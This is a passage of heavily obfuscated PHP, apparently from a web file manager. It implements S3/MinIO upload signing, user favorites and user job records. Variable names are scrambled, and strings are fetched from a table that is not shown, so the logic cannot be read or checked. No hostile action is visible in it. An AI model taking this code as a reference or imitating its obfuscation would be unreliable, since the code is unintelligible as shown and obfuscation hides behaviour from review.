$íÆ×ÌÇÜ[220] . substr($òïÜùÒ, 7); } header($íÆ×ÌÇÜ[175] . $òïÜùÒ); die; } public function hashMd5($Åû¦·¹…, $ÊßŒêö = '') { $×à­†ü¢ = $this->objectMeta($Åû¦·¹…); if (!$×à­†ü¢) { return !1; } $ÊßŒêö = $ÊßŒêö ? $ÊßŒêö : _get($×à­†ü¢, $_SERVER[´‹ô¯Œ][255]); return $ÊßŒêö; } public function uploadFormData($¦è±ÇùÃ, $‘¹’ÌÖ¿ = 3600) { $ıı¼Œİº =& $_SERVER[´‹ô¯Œ]; if (!$this->_isClientAsync()) { $³ê™Ç© = $this->getPreSignedURL($¦è±ÇùÃ, $‘¹’ÌÖ¿, array(), $ıı¼Œİº[256]); return array($ıı¼Œİº[209] => str_replace($ıı¼Œİº[219], $ıı¼Œİº[257], $³ê™Ç©)); } if (isset($GLOBALS[$ıı¼Œİº[6]][$ıı¼Œİº[92]][$ıı¼Œİº[258]]) && $GLOBALS[$ıı¼Œİº[6]][$ıı¼Œİº[92]][$ıı¼Œİº[258]] == $ıı¼Œİº[231]) { return $this->uploadMultiData($¦è±ÇùÃ, $‘¹’ÌÖ¿); } if ($this->signVer == $ıı¼Œİº[250]) { return $this->uploadFormDataV2($¦è±ÇùÃ, $‘¹’ÌÖ¿); } return $this->uploadFormDataV4($¦è±ÇùÃ, $‘¹’ÌÖ¿); } public function uploadFormDataV2($ÆÆ†‡ïÔ, $•–¾ÜÍ = 3600) { $¶Ÿ³Ìùå =& $_SERVER[´‹ô¯Œ]; $Şí”œş» = $this->pathFather($ÆÆ†‡ïÔ); $¹©®í¼» = $this->client->getHttpUploadPostParams($this->bucket, $Şí”œş», $¶Ÿ³Ìùå[232], $•–¾ÜÍ); $¯ÆŒ¥‚ß = array_merge((array) $¹©®í¼», array($¶Ÿ³Ìùå[259] => $¶Ÿ³Ìùå[250], $¶Ÿ³Ìùå[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($¯ÆŒ¥‚ß[$¶Ÿ³Ìùå[259]]); } return $¯ÆŒ¥‚ß; } public function uploadFormDataV4($Ğ§âºİ, $Àëˆ²Àğ = 3600) { $ğïüôåç =& $_SERVER[´‹ô¯Œ]; $Ñ¬¾”™ = $ğïüôåç[232]; $ÒÛèö…› = $ğïüôåç[260]; $í‡ Şª¥ = $ğïüôåç[62]; $¥¬ËÚªş = gmdate($ğïüôåç[261]); $È³ÕÖËŒ = gmdate($ğïüôåç[262]); $ó«ì”–÷ = $ğïüôåç[263]; $ÉıÅ¬»ò = $Àëˆ²Àğ . $ğïüôåç[12]; $¯üÉ¾ = $ğïüôåç[264]; $Öæ™ğÕ = array($this->accessKey, $È³ÕÖËŒ, $this->region, $í‡ Şª¥, $ó«ì”–÷); $í»àšœÖ = implode($ğïüôåç[8], $Öæ™ğÕ); $…ÍÈæ”” = array($ğïüôåç[265] => gmdate($ğïüôåç[266], strtotime($ğïüôåç[267])), $ğïüôåç[268] => array(array($ğïüôåç[269] => $this->bucket), array($ğïüôåç[270], $ğïüôåç[271], $ğïüôåç[12]), array($ğïüôåç[270], $ğïüôåç[272], $ğïüôåç[12]), array($ğïüôåç[273] => $¯üÉ¾), array($ğïüôåç[274] => $í»àšœÖ), array($ğïüôåç[275] => $ÒÛèö…›), array($ğïüôåç[276] => $¥¬ËÚªş), array($ğïüôåç[277] => $ÉıÅ¬»ò))); $ÅÓ…¢ÚŠ = base64_encode(json_encode($…ÍÈæ””)); $èŸâºè = hash_hmac($ğïüôåç[278], $È³ÕÖËŒ, $ğïüôåç[279] . $this->secret, !0); $¯öıò™˜ = hash_hmac($ğïüôåç[278], $this->region, $èŸâºè, !0); $°”Ôş = hash_hmac($ğïüôåç[278], $í‡ Şª¥, $¯öıò™˜, !0); $äÖÔí„Œ = hash_hmac($ğïüôåç[278], $ó«ì”–÷, $°”Ôş, !0); $Ë„†Ğàì = hash_hmac($ğïüôåç[278], $ÅÓ…¢ÚŠ, $äÖÔí„Œ); $Í ±–Á« = array($ğïüôåç[249] => $ğïüôåç[12], $ğïüôåç[273] => $¯üÉ¾, $ğïüôåç[280] => $ÅÓ…¢ÚŠ, $ğïüôåç[274] => $í»àšœÖ, $ğïüôåç[275] => $ÒÛèö…›, $ğïüôåç[276] => $¥¬ËÚªş, $ğïüôåç[277] => $ÉıÅ¬»ò, $ğïüôåç[281] => $Ë„†Ğàì, $ğïüôåç[259] => $ğïüôåç[250], $ğïüôåç[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($Í ±–Á«[$ğïüôåç[259]]); } return $Í ±–Á«; } public function uploadMultiData($ˆÊâ¡Õ, $¼ãÉ©‹— = 3600) { $‹áÍÂï =& $_SERVER[´‹ô¯Œ]; $åß³øÍÁ = $this->signVer == $‹áÍÂï[250] ? gmdate($‹áÍÂï[282]) : gmdate($‹áÍÂï[283]); $šè”Û²Æ = array(); $ËÙáã›Œ = $this->client->getUploadId($this->bucket, $ˆÊâ¡Õ, $šè”Û²Æ); if (!$ËÙáã›Œ) { return !1; } $¨±òÊ¬ñ = array($‹áÍÂï[284] => $ËÙáã›Œ, $‹áÍÂï[209] => $this->getHost() . $‹áÍÂï[8] . $this->pathEncode($ˆÊâ¡Õ), $‹áÍÂï[285] => $åß³øÍÁ, $‹áÍÂï[97] => $ˆÊâ¡Õ, $‹áÍÂï[259] => $this->signVer); if ($this->_isClientAsync()) { unset($¨±òÊ¬ñ[$‹áÍÂï[259]]); } return $¨±òÊ¬ñ; } public function uploadMultiAuth($¿¾‚†ÓÉ, $ÊÃìØğÀ = array()) { $ã”¹­…à =& $_SERVER[´‹ô¯Œ]; if ($this->signVer == $ã”¹­…à[250]) { if (isset($ÊÃìØğÀ[$ã”¹­…à[286]])) { return $this->uploadPartAuthV2($¿¾‚†ÓÉ, $ÊÃìØğÀ); } return $this->uploadListAuthV2($¿¾‚†ÓÉ, $ÊÃìØğÀ); } if (isset($ÊÃìØğÀ[$ã”¹­…à[286]])) { return $this->uploadPartAuthV4($¿¾‚†ÓÉ, $ÊÃìØğÀ); } return $this->uploadListAuthV4($¿¾‚†ÓÉ, $ÊÃìØğÀ); } public function uploadPartAuthV2($ĞÄìîã, $ºÀ¥Ë›¾ = array()) { $ä³À”Ñ =& $_SERVER[´‹ô¯Œ]; $Ù®ÅÏë” = $ºÀ¥Ë›¾[$ä³À”Ñ[97]]; $¯ãšŸİÈ = gmdate($ä³À”Ñ[282]); $‘—¯ÄÔÚ = array_intersect_key($ºÀ¥Ë›¾, array_flip(array($ä³À”Ñ[286], $ä³À”Ñ[284]))); ksort($‘—¯ÄÔÚ); $²åÉ¬ãÅ = $‘—¯ÄÔÚ ? $ä³À”Ñ[76] . http_build_query($‘—¯ÄÔÚ, null, $ä³À”Ñ[287], PHP_QUERY_RFC3986) : $ä³À”Ñ[12]; $‚Ü–’„à = array($ä³À”Ñ[256], $ä³À”Ñ[12], $ä³À”Ñ[123], $ä³À”Ñ[12], "\x78\55\141\x6d\x7a\x2d\144\x61\164\145\72{$¯ãšŸİÈ}", $ä³À”Ñ[8] . $this->bucket . $ä³À”Ñ[8] . $this->pathEncode($Ù®ÅÏë”) . $²åÉ¬ãÅ); $øë¾Ô = implode($ä³À”Ñ[288], $‚Ü–’„à); $·«€«…³ = $this->client->__getSignature($øë¾Ô); return array($ä³À”Ñ[289] => $·«€«…³, $ä³À”Ñ[285] => $¯ãšŸİÈ); } public function uploadListAuthV2($‰“ù ×, $ì– ¨†˜ = array()) { $ä€ùµ“ =& $_SERVER[´‹ô¯Œ]; $¤Êœ´½œ = $ì– ¨†˜[$ä€ùµ“[97]]; $Ã¼Åö’ = $ì– ¨†˜[$ä€ùµ“[284]]; $§“«ÜÓ¢ = $this->client->listParts($this->bucket, $¤Êœ´½œ, $Ã¼Åö’); if (!$§“«ÜÓ¢) { return !1; } $¤ˆÑÍ™ = gmdate($ä€ùµ“[282]); $Ô‰â½Ş = $ä€ùµ“[290] . $Ã¼Åö’; $éÅ«ÏÔ£ = array($ä€ùµ“[291], $ä€ùµ“[12], $ä€ùµ“[123], $ä€ùµ“[12], "\x78\55\x61\x6d\x7a\x2d\x64\141\164\145\x3a{$¤ˆÑÍ™}", $ä€ùµ“[8] . $this->bucket . $ä€ùµ“[8] . $this->pathEncode($¤Êœ´½œ) . $Ô‰â½Ş); $ªêúàº· = implode($ä€ùµ“[288], $éÅ«ÏÔ£); $¤¯Â¦â¶ = $this->client->__getSignature($ªêúàº·); return array($ä€ùµ“[289] => $¤¯Â¦â¶, $ä€ùµ“[285] => $¤ˆÑÍ™, $ä€ùµ“[292] => $§“«ÜÓ¢); } public function uploadPartAuthV4($öÛË¾êô, $åôßË¡¹ = array()) { $ì»ºÚâ =& $_SERVER[´‹ô¯Œ]; $Á…èé¼Å = $åôßË¡¹[$ì»ºÚâ[97]]; $Ìî—ÒÏŒ = array($ì»ºÚâ[276] => gmdate($ì»ºÚâ[283]), $ì»ºÚâ[293] => _get($åôßË¡¹, $ì»ºÚâ[294], hash($ì»ºÚâ[278], $ì»ºÚâ[12]))); $íìşÇ—ê = explode($ì»ºÚâ[211], $this->getHost()); $ºà Í“ = array($ì»ºÚâ[295] => $íìşÇ—ê[1], $ì»ºÚâ[296] => $ì»ºÚâ[12], $ì»ºÚâ[249] => $ì»ºÚâ[123], $ì»ºÚâ[297] => $åôßË¡¹[$ì»ºÚâ[79]]); $¼Éğ™Ãî = $ì»ºÚâ[256]; $°À¶Ç³¦ = $ì»ºÚâ[8] . $this->pathEncode($Á…èé¼Å); $È¹çÊ€‡ = array_intersect_key($åôßË¡¹, array_flip(array($ì»ºÚâ[286], $ì»ºÚâ[284]))); $»›ÉáÊ = $this->client->__getSignatureV4($Ìî—ÒÏŒ, $ºà Í“, $¼Éğ™Ãî, $°À¶Ç³¦, $È¹çÊ€‡); return array($ì»ºÚâ[289] => $»›ÉáÊ, $ì»ºÚâ[293] => $Ìî—ÒÏŒ[$ì»ºÚâ[293]], $ì»ºÚâ[285] => $Ìî—ÒÏŒ[$ì»ºÚâ[276]]); } public function uploadListAuthV4($ş€ÇÁñ•, $´¼ğíäÁ = array()) { $–‹àİî =& $_SERVER[´‹ô¯Œ]; $‹òæ¨  = $´¼ğíäÁ[$–‹àİî[97]]; $òŠÍù = $´¼ğíäÁ[$–‹àİî[284]]; $Üãïô‘¿ = $this->client->listParts($this->bucket, $‹òæ¨ , $òŠÍù); if (!$Üãïô‘¿) { return !1; } $šÂŒõ©´ = $–‹àİî[298]; foreach ($Üãïô‘¿ as $€ì€´¹Ñ) { $šÂŒõ©´ .= $–‹àİî[299] . "\74\x50\x61\x72\x74\x4e\165\155\142\145\x72\76{$€ì€´¹Ñ[$–‹àİî[300]]}\x3c\57\120\141\x72\164\116\165\x6d\x62\145\162\x3e\xa" . "\x3c\105\x54\141\x67\x3e{$€ì€´¹Ñ[$–‹àİî[301]]}\74\x2f\105\x54\x61\147\x3e\xa" . $–‹àİî[302]; } $šÂŒõ©´ .= $–‹àİî[303]; $âğ¹­¤¦ = array($–‹àİî[276] => gmdate($–‹àİî[283]), $–‹àİî[293] => hash($–‹àİî[278], $šÂŒõ©´)); $Ğå³©Àé = explode($–‹àİî[211], $this->getHost()); $“«Íˆ„ = array($–‹àİî[295] => $Ğå³©Àé[1], $–‹àİî[249] => $–‹àİî[123], $–‹àİî[297] => strlen($šÂŒõ©´)); $¸üÅåõÇ = $–‹àİî[291]; $Á¢È±šè = $–‹àİî[8] . $this->pathEncode($‹òæ¨ ); $é©×‡­ = array($–‹àİî[284] => $òŠÍù); $²ËØŞ«‰ = $this->client->__getSignatureV4($âğ¹­¤¦, $“«Íˆ„, $¸üÅåõÇ, $Á¢È±šè, $é©×‡­); return array($–‹àİî[289] => $²ËØŞ«‰, $–‹àİî[293] => $âğ¹­¤¦[$–‹àİî[293]], $–‹àİî[285] => $âğ¹­¤¦[$–‹àİî[276]], $–‹àİî[292] => $Üãïô‘¿); } private function _isClientAsync() { $ıê¤ûú• =& $_SERVER[´‹ô¯Œ]; static $ÎÎÎšŞŞ = null; if ($ÎÎÎšŞŞ === null) { $ÆõÜú© = isset($_REQUEST[$ıê¤ûú•[304]]) ? json_decode($_REQUEST[$ıê¤ûú•[304]], !0) : !1; $ÎÎÎšŞŞ = $ÆõÜú© && _get($ÆõÜú©, $ıê¤ûú•[305]) == $ıê¤ûú•[306]; } return $ÎÎÎšŞŞ; } public function getHost() { $”€áÙŠ· =& $_SERVER[´‹ô¯Œ]; $ÈÎçØ„ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($”€áÙŠ·[70], $”€áÙŠ·[64], $”€áÙŠ·[69], $”€áÙŠ·[62]))) { return $ÈÎçØ„ . $”€áÙŠ·[8] . $this->bucket; } if ($this->osType == $”€áÙŠ·[62] && !is_domain($ÈÎçØ„)) { return $ÈÎçØ„ . $”€áÙŠ·[8] . $this->bucket; } $ÈÎçØ„ = explode($”€áÙŠ·[211], $ÈÎçØ„); return $ÈÎçØ„[0] . $”€áÙŠ·[211] . $this->bucket . $”€áÙŠ·[10] . $ÈÎçØ„[1]; } public function size($Û™­ĞŞ) { $“Ç½µ·Ò = $this->objectMeta($Û™­ĞŞ); return $“Ç½µ·Ò ? $“Ç½µ·Ò[$_SERVER[´‹ô¯Œ][79]] : 0; } public function info($åü øğò) { if ($this->isFolder($åü øğò)) { return $this->folderInfo($åü øğò); } else { if ($this->isFile($åü øğò)) { return $this->fileInfo($åü øğò); } } return !1; } public function exist($ÆèÕĞÀı) { return $this->isFile($ÆèÕĞÀı) || $this->isFolder($ÆèÕĞÀı); } public function isFile($×±ÜÎìØ) { return !$this->isFolder($×±ÜÎìØ) && $this->objectMeta($×±ÜÎìØ); } public function isFolder($àÊöƒÖÌ) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][180], $àÊöƒÖÌ); } protected function objectMeta($® Óü³“) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][182], $® Óü³“); } protected function _objectMeta($‚û™Ï¨Ô) { $è²Â×¶ =& $_SERVER[´‹ô¯Œ]; $‚û™Ï¨Ô = rtrim($‚û™Ï¨Ô, $è²Â×¶[8]); try { $µ‹ôØ = $this->client->getObjectInfo($this->bucket, $‚û™Ï¨Ô); if (!isset($µ‹ôØ[$è²Â×¶[255]]) && isset($µ‹ôØ[$è²Â×¶[307]])) { $µ‹ôØ[$è²Â×¶[255]] = $µ‹ôØ[$è²Â×¶[307]]; } } catch (Exception $¸†³Ùğú) { $µ‹ôØ = !1; } if (!$µ‹ôØ) { } return $µ‹ôØ; } protected function _isFolder($¶›¸‡œğ) { $€´×ƒÉ¼ =& $_SERVER[´‹ô¯Œ]; $¶›¸‡œğ = rtrim($¶›¸‡œğ, $€´×ƒÉ¼[8]) . $€´×ƒÉ¼[8]; if ($¶›¸‡œğ == $€´×ƒÉ¼[12] || $¶›¸‡œğ == $€´×ƒÉ¼[8]) { return !0; } $ÃüõÉÖé = $this->client->getBucket($this->bucket, $¶›¸‡œğ, null, 1); if (empty($ÃüõÉÖé[$€´×ƒÉ¼[239]])) { return !1; } $»Ãñæì» = $ÃüõÉÖé[$€´×ƒÉ¼[239]][0][$€´×ƒÉ¼[32]]; return stripos($»Ãñæì», $¶›¸‡œğ) === 0 ? !0 : !1; if (substr($»Ãñæì», -1) == $€´×ƒÉ¼[8]) { return !0; } if (get_path_this($»Ãñæì») == get_path_this($¶›¸‡œğ)) { return !1; } return !0; } public function listObject($àµ­Öâ¬) { return $this->fileList($àµ­Öâ¬, $_SERVER[´‹ô¯Œ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ˆ¥™áÆè) { $ÓÍÑÓÆ =& $_SERVER[´‹ô¯Œ]; parent::__construct($ˆ¥™áÆè); $this->setSignVersion($ÓÍÑÓÆ[250]); if (!$this->region) { $this->region = $ÓÍÑÓÆ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $´ıçØ¹Ò = $this->getBktRegion(); return $this->region == $´ıçØ¹Ò ? !0 : !1; } public function uploadFormData($Ä‹Ø ·´, $Ì¿®‚«• = 3600) { $‘Ş°Áë =& $_SERVER[´‹ô¯Œ]; $‘·ûäšø = $‘Ş°Áë[232]; $ˆúÈüÕ = $‘Ş°Áë[260]; $…Ñ€œã¹ = $‘Ş°Áë[62]; $µ°×«Äµ = gmdate($‘Ş°Áë[261]); $ÜàïÎ×ß = gmdate($‘Ş°Áë[262]); $º‡á¶ñ± = $‘Ş°Áë[263]; $¨ …„‡¿ = $Ì¿®‚«• . $‘Ş°Áë[12]; $¹È¹± ı = $‘Ş°Áë[264]; $°‹Ïâæ× = array($this->accessKey, $ÜàïÎ×ß, $this->region, $…Ñ€œã¹, $º‡á¶ñ±); $öÅ—ŠëÁ = implode($‘Ş°Áë[8], $°‹Ïâæ×); $â˜ãÎé = array($‘Ş°Áë[265] => gmdate($‘Ş°Áë[266], strtotime($‘Ş°Áë[267])), $‘Ş°Áë[268] => array(array($‘Ş°Áë[269] => $this->bucket), array($‘Ş°Áë[309] => $‘·ûäšø), array($‘Ş°Áë[270], $‘Ş°Áë[271], $‘Ş°Áë[12]), array($‘Ş°Áë[270], $‘Ş°Áë[272], $‘Ş°Áë[12]), array($‘Ş°Áë[270], $‘Ş°Áë[310], $‘Ş°Áë[12]), array($‘Ş°Áë[273] => $¹È¹± ı), array($‘Ş°Áë[274] => $öÅ—ŠëÁ), array($‘Ş°Áë[275] => $ˆúÈüÕ), array($‘Ş°Áë[276] => $µ°×«Äµ), array($‘Ş°Áë[277] => $¨ …„‡¿))); $ôóùÅÜŠ = base64_encode(json_encode($â˜ãÎé)); $šï–óÏİ = hash_hmac($‘Ş°Áë[278], $ÜàïÎ×ß, $‘Ş°Áë[279] . $this->secret, !0); $ï¼É±ú = hash_hmac($‘Ş°Áë[278], $this->region, $šï–óÏİ, !0); $©‚Ä¡ = hash_hmac($‘Ş°Áë[278], $…Ñ€œã¹, $ï¼É±ú, !0); $·ÌÊÃäĞ = hash_hmac($‘Ş°Áë[278], $º‡á¶ñ±, $©‚Ä¡, !0); $éšì½Ê„ = hash_hmac($‘Ş°Áë[278], $ôóùÅÜŠ, $·ÌÊÃäĞ); $ŞÅ°Ï½ = array($‘Ş°Áë[249] => $‘Ş°Áë[12], $‘Ş°Áë[297] => $‘Ş°Áë[12], $‘Ş°Áë[309] => $‘·ûäšø, $‘Ş°Áë[273] => $¹È¹± ı, $‘Ş°Áë[280] => $ôóùÅÜŠ, $‘Ş°Áë[311] => $öÅ—ŠëÁ, $‘Ş°Áë[312] => $ˆúÈüÕ, $‘Ş°Áë[313] => $µ°×«Äµ, $‘Ş°Áë[314] => $¨ …„‡¿, $‘Ş°Áë[315] => $éšì½Ê„, $‘Ş°Áë[209] => $this->getHost()); return $ŞÅ°Ï½; } } goto F´é‹…ì¯Ü; bòÕº°±œ‚: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($Ãİ½Ú££) { $ë‚ŒìÑè =& $_SERVER[´‹ô¯Œ]; return array($ë‚ŒìÑè[2112] => array(USER_ID, $ë‚ŒìÑè[2488])); } protected function listData() { $­´ª¾£ =& $_SERVER[´‹ô¯Œ]; $åìé£ = array($­´ª¾£[1787] => USER_ID, $­´ª¾£[571] => 0); $éÓù¦’² = $­´ª¾£[2489]; $á¤£íÓé = $this->field($éÓù¦’²)->where($åìé£)->order($­´ª¾£[2490])->select(); return $á¤£íÓé ? $á¤£íÓé : array(); } protected function resetCache() { } protected function listView() { $ß·™ÔÊì =& $_SERVER[´‹ô¯Œ]; $ûÖÅ—ÙÉ = $this->listData(); $”ûó®ú = array_filter_by_field($ûÖÅ—ÙÉ, $ß·™ÔÊì[33], $ß·™ÔÊì[502]); $ë­Àâäç = array_to_keyvalue($”ûó®ú, $ß·™ÔÊì[12], $ß·™ÔÊì[87]); if (!$ë­Àâäç) { return $ûÖÅ—ÙÉ; } $¿îƒº = 2000; $€ëƒ—Ö = array($ß·™ÔÊì[503] => array($ß·™ÔÊì[504], $ë­Àâäç)); $¢Ñ¿‘ó¿ = Model($ß·™ÔÊì[916])->listSource($€ëƒ—Ö, $¿îƒº); $¢Ñ¿‘ó¿ = array_merge($¢Ñ¿‘ó¿[$ß·™ÔÊì[86]], $¢Ñ¿‘ó¿[$ß·™ÔÊì[85]]); $¢Ñ¿‘ó¿ = array_to_keyvalue($¢Ñ¿‘ó¿, $ß·™ÔÊì[194]); foreach ($ûÖÅ—ÙÉ as $ª±áõøå => $õ·™Â£°) { $Äúˆ­µ  = $¢Ñ¿‘ó¿[$õ·™Â£°[$ß·™ÔÊì[87]]]; $Äúˆ­µ  = $Äúˆ­µ  ? $Äúˆ­µ  : array(); $ûÖÅ—ÙÉ[$ª±áõøå] = array_merge($Äúˆ­µ , $õ·™Â£°); } return $ûÖÅ—ÙÉ; } protected function addFav($òƒŠ€›, $†Ëö’¬¥ = '', $ÁªàÇÈ¼ = "\x73\x6f\165\x72\143\x65") { $ù¹ÑÒ÷ã =& $_SERVER[´‹ô¯Œ]; $ ˜¾¥í = array($ù¹ÑÒ÷ã[1787] => USER_ID, $ù¹ÑÒ÷ã[571] => 0, $ù¹ÑÒ÷ã[508] => $ÁªàÇÈ¼, $ù¹ÑÒ÷ã[507] => $òƒŠ€›); if ($this->where($ ˜¾¥í)->find()) { return !1; } $ ˜¾¥í = array($ù¹ÑÒ÷ã[1787] => USER_ID, $ù¹ÑÒ÷ã[571] => 0); $ºÄÇƒİã = $this->where($ ˜¾¥í)->max($ù¹ÑÒ÷ã[2020]); if (!$ºÄÇƒİã) { $ºÄÇƒİã = 0; } if (!$†Ëö’¬¥ && $ÁªàÇÈ¼ == $ù¹ÑÒ÷ã[502]) { $ïÌøÑ÷ = Model($ù¹ÑÒ÷ã[1445])->where(array($ù¹ÑÒ÷ã[503] => $òƒŠ€›))->find(); if (!$ïÌøÑ÷) { return !1; } $†Ëö’¬¥ = $ïÌøÑ÷[$ù¹ÑÒ÷ã[32]]; } $†Ëö’¬¥ = $this->getAutoName($†Ëö’¬¥); $ãáÆÙù = array($ù¹ÑÒ÷ã[1787] => USER_ID, $ù¹ÑÒ÷ã[571] => 0, $ù¹ÑÒ÷ã[506] => $†Ëö’¬¥, $ù¹ÑÒ÷ã[507] => $òƒŠ€›, $ù¹ÑÒ÷ã[508] => $ÁªàÇÈ¼, $ù¹ÑÒ÷ã[2000] => $ºÄÇƒİã + 1); return $this->add($ãáÆÙù); } protected function remove($è®¥¸ƒ¿) { $“šÔÄáÜ =& $_SERVER[´‹ô¯Œ]; $Öôµóñ = array($“šÔÄáÜ[1787] => USER_ID, $“šÔÄáÜ[505] => $è®¥¸ƒ¿); return $this->where($Öôµóñ)->delete(); } protected function removeByName($Ò³ÙÕ·”) { $ÄòÛÂ›— =& $_SERVER[´‹ô¯Œ]; $È÷‘©‰Ç = array($ÄòÛÂ›—[1787] => USER_ID, $ÄòÛÂ›—[506] => $Ò³ÙÕ·”, $ÄòÛÂ›—[571] => 0); return $this->where($È÷‘©‰Ç)->delete(); } protected function rename($è×Ùµ÷¦, $¢äó°‹) { $‘ë£ŒÑ =& $_SERVER[´‹ô¯Œ]; if ($è×Ùµ÷¦ == $¢äó°‹) { return !1; } $Úß‘·©¥ = $this->getAutoName($¢äó°‹); if ($¢äó°‹ != $Úß‘·©¥) { return !1; } $ö¦º—³ = array($‘ë£ŒÑ[1787] => USER_ID, $‘ë£ŒÑ[571] => 0, $‘ë£ŒÑ[32] => $è×Ùµ÷¦); return $this->where($ö¦º—³)->save(array($‘ë£ŒÑ[32] => $¢äó°‹)); } protected function resetSort($Ú“›õºÃ) { $æé¿“ìÍ =& $_SERVER[´‹ô¯Œ]; $Ú“›õºÃ = is_array($Ú“›õºÃ) ? $Ú“›õºÃ : array(); $ÕáÖ†Æ€ = array($æé¿“ìÍ[1787] => USER_ID); for ($ùúãàˆÖ = 0; $ùúãàˆÖ < count($Ú“›õºÃ); $ùúãàˆÖ++) { $ÕáÖ†Æ€[$æé¿“ìÍ[505]] = $Ú“›õºÃ[$ùúãàˆÖ]; $this->where($ÕáÖ†Æ€)->save(array($æé¿“ìÍ[2000] => $ùúãàˆÖ + 1)); } return !0; } protected function moveTop($ÉÀ¨Á) { $ó´«şã =& $_SERVER[´‹ô¯Œ]; $Ä½‘Ö´ = array($ó´«şã[1787] => USER_ID, $ó´«şã[571] => 0); $±ÚÜ»‰ä = $this->where($Ä½‘Ö´)->where(array($ó´«şã[32] => $ÉÀ¨Á))->find(); if (!$±ÚÜ»‰ä) { return; } $ª‡ïë© = $this->field($ó´«şã[487])->where($Ä½‘Ö´)->order($ó´«şã[2490])->select(); $ª‡ïë© = array_to_keyvalue($ª‡ïë©, $ó´«şã[12], $ó´«şã[487]); $ÃŠÄşîÀ = $ª‡ïë©; $ª‡ïë© = array_remove_value($ª‡ïë©, $±ÚÜ»‰ä[$ó´«şã[487]]); array_unshift($ª‡ïë©, $±ÚÜ»‰ä[$ó´«şã[487]]); return $this->resetSort($ª‡ïë©); } protected function moveBottom($İ…†¥‘™) { $å«—»– =& $_SERVER[´‹ô¯Œ]; $£±®¬Òä = array($å«—»–[1787] => USER_ID, $å«—»–[571] => 0); $¥ŞûÑ— = $this->where($£±®¬Òä)->max($å«—»–[2020]); $é±÷Ñ¯° = array($å«—»–[2020] => $¥ŞûÑ— + 1); return $this->where($£±®¬Òä)->where(array($å«—»–[32] => $İ…†¥‘™))->save($é±÷Ñ¯°); } private function getAutoName($ÏÑæ´Û) { $ÀÈ—ôƒÔ =& $_SERVER[´‹ô¯Œ]; $ää¥ëú = array($ÀÈ—ôƒÔ[1787] => USER_ID, $ÀÈ—ôƒÔ[571] => 0); $¿û¥Ş¦ = $this->field($ÀÈ—ôƒÔ[32])->where($ää¥ëú)->select(); $¿û¥Ş¦ = array_to_keyvalue($¿û¥Ş¦, $ÀÈ—ôƒÔ[12], $ÀÈ—ôƒÔ[32]); if (!$¿û¥Ş¦ || !in_array($ÏÑæ´Û, $¿û¥Ş¦)) { return $ÏÑæ´Û; } for ($‹š·“‰‰ = 0; $‹š·“‰‰ < count($¿û¥Ş¦); $‹š·“‰‰++) { if (!in_array($ÏÑæ´Û . "\50{$‹š·“‰‰}\x29", $¿û¥Ş¦)) { return $ÏÑæ´Û . "\50{$‹š·“‰‰}\51"; } } return $ÏÑæ´Û . "\x28{$‹š·“‰‰}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\152\x6f\x62\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x64\x65\x73\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\x66\112\157\x62\x4c\x69\x73\x74"; public function listData($Šóº’ˆÖ = false, $÷÷Åî‡ö = "\163\x6f\x72\x74", $®ï‡©€ = false) { return parent::listData($Šóº’ˆÖ, $÷÷Åî‡ö, $®ï‡©€); } public function remove($µ©‰š’») { return parent::remove($µ©‰š’»); } public function add($Óø‚ö) { $¦ÀÌ¡ù™ =& $_SERVER[´‹ô¯Œ]; if ($this->findByName($Óø‚ö[$¦ÀÌ¡ù™[32]])) { return !1; } $Óø‚ö[$¦ÀÌ¡ù™[2020]] = $this->getSort(); return parent::insert($Óø‚ö); } private function getSort() { $¬‚Ù…ê =& $_SERVER[´‹ô¯Œ]; $˜ÂĞÜ¹ = parent::listData(); $øÃ¾õª• = array_to_keyvalue($˜ÂĞÜ¹, $¬‚Ù…ê[12], $¬‚Ù…ê[2020]); return empty($øÃ¾õª•) ? 0 : max($øÃ¾õª•) + 1; } public function update($¾„ÊÎÓ, $‘í¹ÚÜ) { $·ˆ÷ÃÜ¡ =& $_SERVER[´‹ô¯Œ]; $²øºµ½Ë = parent::listData($¾„ÊÎÓ); $ÕÏ¯½À‰ = $this->findByName($‘í¹ÚÜ[$·ˆ÷ÃÜ¡[32]]); if (!$²øºµ½Ë || $ÕÏ¯½À‰ && $ÕÏ¯½À‰[$·ˆ÷ÃÜ¡[487]] != $²øºµ½Ë[$·ˆ÷ÃÜ¡[487]]) { return !1; } return parent::update($¾„ÊÎÓ, $‘í¹ÚÜ); } public function setUserJob($Œ…Í”Û², $È§½º) { $ëÇúÉñ‹ =& $_SERVER[´‹ô¯Œ]; if (!is_array($È§½º)) { $È§½º = array($È§½º); } $ÂõÕ× = parent::listData(); $®Ğ†éİÏ = array_to_keyvalue($ÂõÕ×, $ëÇúÉñ‹[32]); $¡÷ Ğí = $ëÇúÉñ‹[457]; foreach ($È§½º as $Üªü¦á) { if ($®Ğ†éİÏ[$Üªü¦á]) { $¡÷ Ğí .= $®Ğ†éİÏ[$Üªü¦á][$ëÇúÉñ‹[487]] . $ëÇúÉñ‹[50]; } else { $ıø·¯Îô = $this->add($Üªü¦á); $¡÷ Ğí .= $ıø·¯Îô . $ëÇúÉñ‹[50]; } } $¡÷ Ğí = rtrim($¡÷ Ğí, $ëÇúÉñ‹[50]); Model($ëÇúÉñ‹[611])->metaSet($Œ…Í”Û², self::JOB_KEY, $¡÷ Ğí); } public function getUserJob($ÊìÜü ) { $„‹ë×¥ù = Model($_SERVER[´‹ô¯Œ][611])->metaGet($ÊìÜü ); return $this->getUserJobInfo($„‹ë×¥ù[self::JOB_KEY]); } public function getUserJobInfo($¿—ƒÇò) { $Êî™Á¹‹ =& $_SERVER[´‹ô¯Œ]; $ğ©¬ÛÅ = explode($Êî™Á¹‹[50], $¿—ƒÇò); $Ïî‹¶ÏÃ = parent::listData(); $Ïî‹¶ÏÃ = 